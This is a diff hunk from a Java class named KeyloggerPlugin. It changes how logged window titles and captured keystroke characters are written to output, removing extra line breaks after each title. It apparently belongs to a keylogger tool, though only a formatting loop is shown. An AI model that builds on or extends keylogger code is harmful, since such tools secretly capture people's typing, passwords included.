@@ -172,7 +172,7 @@ public class KeyloggerPlugin extends StubPlugin {
 						
 						for (Activity a : Activities.activities) {
 							if (a instanceof Title) {
-								out.println("\n\r" + a.toString() + "\n\r\n\r");
+								out.println("\n\r" + a.toString());
 							} else if (a instanceof Key) {
 								out.print(((Key)a).getChar());
 							}
